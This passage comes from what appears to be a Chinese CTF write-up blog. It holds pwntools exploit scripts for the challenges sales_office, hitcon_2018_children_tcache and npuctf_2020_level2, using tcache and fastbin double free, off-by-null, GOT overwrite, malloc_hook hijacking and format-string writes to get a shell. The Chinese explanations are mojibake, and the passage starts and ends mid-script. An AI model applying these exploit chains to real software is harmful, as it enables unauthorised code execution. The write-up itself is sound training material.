class="token number">0x68</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xb</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>onegadget<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>__libc_realloc<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="0x9-å®‰æ’å››æœˆèµ›sales-office-libc2-29"><a href="#0x9-å®‰æ’å››æœˆèµ›sales-office-libc2-29" class="headerlink" title="0x9.å®‰æ’å››æœˆèµ›sales_office(libc2.29)"></a>0x9.å®‰æ’å››æœˆèµ›sales_office(libc2.29)</h2><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/23.jpg" alt=""></p><p>gotè¡¨å¯å†™ï¼Œæ— PIE</p><p>ç¨‹åºçš„å­˜å‚¨ç»“æ„ç±»ä¼¼äºcontent(0x20)â€“&gt;chunk,å³ç³»ç»Ÿåˆ†é…ä¸€ä¸ª0x20å¤§å°çš„chunkï¼Œå­˜å‚¨ç€ç”¨æˆ·åˆ†é…çš„chunkçš„åœ°å€ã€‚è¿™é“é¢˜ä¸€å…±æœ‰ä¸¤ä¸ªç¯å¢ƒï¼Œä¸€ä¸ª2.27çš„ï¼Œç”±äºå­˜åœ¨uafï¼Œ2.27çš„åˆ©ç”¨éå¸¸ç®€å•ï¼Œç›¸å¯¹äº2.27ï¼Œ2.29çš„tcacheå­˜åœ¨å¯¹doublefreeçš„æ£€æµ‹ï¼Œæ‰€ä»¥éš¾åº¦æ›´å¤§äº†ä¸€äº›ï¼Œä½†fastbinä¸­ä¾æ—§å¯ä»¥doublefreeï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æŠŠtcacheå¡«æ»¡ï¼Œåœ¨fastbinä¸­è¿›è¡Œdoublefreeå³å¯ï¼Œexpå¦‚ä¸‹ï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./sales_office'</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./sales_office'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># io = remote('das.wetolink.com', 28499)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./sales_office'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc-2.29.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'house:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'your house:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    dele<span class="token punctuation">(</span>i<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span>                <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(io)</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="0xa-hitcon-2018-children-tcache"><a href="#0xa-hitcon-2018-children-tcache" class="headerlink" title="0xa.hitcon_2018_children_tcache"></a>0xa.hitcon_2018_children_tcache</h2><p>è€ƒå¯Ÿç‚¹:off-by-null</p><p>é¢˜ç›®ä¿æŠ¤å…¨å¼€ï¼Œä½†ç”±äºæ˜¯2.27çš„libcï¼Œå­˜åœ¨tcacheï¼Œæ‰€ä»¥åˆ©ç”¨ä¼šç®€å•äº›</p><p>æ¼æ´ç‚¹åœ¨newåŠŸèƒ½ä¸­è¾“å…¥dataçš„å‡½æ•°</p><pre class=" language-c"><code class="language-c">  <span class="token keyword">signed</span> __int64 result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-4h]</span>  v3 <span class="token operator">=</span> <span class="token function">__read_chk</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> a1<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"read error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  result <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v3 <span class="token operator">-</span> <span class="token number">1LL</span> <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_BYTE<span class="token punctuation">)</span>result <span class="token operator">==</span> <span class="token number">10</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    result <span class="token operator">=</span> v3 <span class="token operator">-</span> <span class="token number">1LL</span> <span class="token operator">+</span> a1<span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span></code></pre><p>æœ€åä¼šå°†ç©ºæ ¼æ¢ä¸ºnull</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡off-by-oneæ³„éœ²åœ°å€ï¼Œå¹¶æ„é€ å‡ºå †å—å¤ç”¨ï¼Œé€ æˆdoublefreeï¼Œæ”»å‡»malloc_hook</p><p>expå¦‚ä¸‹</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./HITCON_2018_children_tcache'</span><span class="token comment" spellcheck="true">#io = process('./HITCON_2018_children_tcache')</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">28160</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'HITCON_2018_children_tcache'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 0</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">"b"</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># 1</span>add<span class="token punctuation">(</span><span class="token number">0x4f0</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 2</span>add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># 3</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token operator">-</span>i<span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x28</span><span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># 0</span>    dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x540</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true"># 0</span>dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># 1</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3ebca0</span>free_hook <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>__malloc_hook <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>onegadget <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x4f322</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'free_hook => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'malloc_hook => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>__malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'onegadget => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>onegadget<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>__malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>__malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>onegadget<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>æ³„éœ²åœ°å€çš„æ€è·¯ä¸ºï¼šæ„é€ ä¸‰ä¸ªchunkï¼Œç¼–å·ä¸º0ï¼Œ1ï¼Œ2ï¼Œé€šè¿‡chunk1off-by-onechunk2ï¼Œå°†chunk2çš„prevsizeè®¾ç½®ä¸ºchunk0+chunk1ï¼Œå¹¶å°†å…¶æ ‡å¿—ä½æ¸…é›¶ï¼Œè¿™æ ·dele2å°±ä¼šå°†chunk012ä¸€èµ·deleï¼Œdele chunk2ä¹‹å‰æˆ‘ä»¬éœ€è¦å…ˆå°†chunk0deleï¼Œç„¶åæˆ‘ä»¬å°†chunk0ç”³è¯·å›æ¥ï¼Œmain_arenaçš„åœ°å€å°±è½åˆ°äº†chunk1ä¸Šï¼Œè€Œchunk1ä»åœ¨ä½¿ç”¨çŠ¶æ€ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦show(1)å°±èƒ½æ³„éœ²å‡ºlibcåœ°å€ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œdeleå‡½æ•°åœ¨freeæ‰ç›¸åº”çš„chunkåï¼Œä¼šå°†æ•°æ®æ®µå…¨éƒ¨ç½®ä¸º0xdaï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å°†chunk2çš„prevsizeä½(ä¹Ÿå°±æ˜¯chunk1çš„æœ€åå…«å­—èŠ‚)æ¯æ¬¡ä¸€å­—èŠ‚æ¸…é›¶ï¼Œç„¶åå†è¿›è¡Œoffbynullã€‚</p><p>æœ‰äº†åœ°å€ä¹‹åæˆ‘ä»¬å°±èƒ½ç®—å‡ºå…¶ä»–å‡½æ•°åœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Œç„¶åæˆ‘ä»¬å†ç”³è¯·ä¸€ä¸ªchunk1å¤§å°çš„chunkï¼Œå³ä¸ºchunk2(åŸæœ¬çš„chunk2å·²ç»è¢«free)ï¼Œè¿™æ ·chunk1å’Œchunk2æŒ‡å‘çš„æ˜¯åŒä¸€å—åœ°å€ï¼Œæˆ‘ä»¬dele(1),dele(2)ï¼Œå°±èƒ½é€ æˆdoublefreeï¼Œç„¶ååŠ«æŒmalloc_hookå³å¯getshell</p><h2 id="0xb-npuctf-2020-level2"><a href="#0xb-npuctf-2020-level2" class="headerlink" title="0xb.npuctf_2020_level2"></a>0xb.npuctf_2020_level2</h2><p>Ubuntu18çš„ç¯å¢ƒï¼Œä¸€é“æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨bssæ®µä¸Šçš„é¢˜ï¼Œé™¤äº†canaryå…¶ä»–ä¿æŠ¤å…¨éƒ¨å¼€å¯.æˆ‘æœ€ä¸æ“…é•¿çš„ç±»å‹å°±æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œè¿™ç§åœ¨bssæ®µä¸Šçš„é¢˜ç›®ä»æ¥æ²¡åšè¿‡ï¼Œå¹³å¸¸åšçš„ä¹Ÿéƒ½æ˜¯ä¸€äº›ç®€å•çš„å¤å†™gotè¡¨çš„é¢˜ç›®ï¼Œè¿™é“é¢˜ç›®å›°æ‰°äº†æˆ‘å¾ˆä¹…ï¼Œæ¯”èµ›æœ€åä¸€å¤©æ‰å‡ºæ¥ï¼Œå…ˆæŠŠexpè´´ä¸Š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token comment" spellcheck="true">#io = process("./level2")</span><span class="token comment" spellcheck="true">#io=remote('ha1cyon-ctf.fun',30258)</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">28126</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'level2'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.27_x64.so'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"%6$p%7$p%9$p"</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>pro_base <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x830</span>libc_base <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">231</span>stack <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">232</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'pro_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>pro_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'stack => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>onegadget <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x4f322</span>offset0 <span class="token operator">=</span> stack <span class="token operator">&amp;</span> <span class="token number">0xffff</span>offset1 <span class="token operator">=</span> onegadget <span class="token operator">&amp;</span> <span class="token number">0xffff</span>offset2 <span class="token operator">=</span> <span class="token punctuation">(</span>onegadget <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'onegadget => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>onegadget<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'offset0 => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>offset0<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'offset1 => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>offset1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'offset2 => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>offset2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>offset0<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c"</span><span class="token operator">+</span><span class="token string">"%9$hnxxxx\x00"</span><span class="token comment" spellcheck="true">#gdb.attach(io)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"xxxx"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"%"</span><span 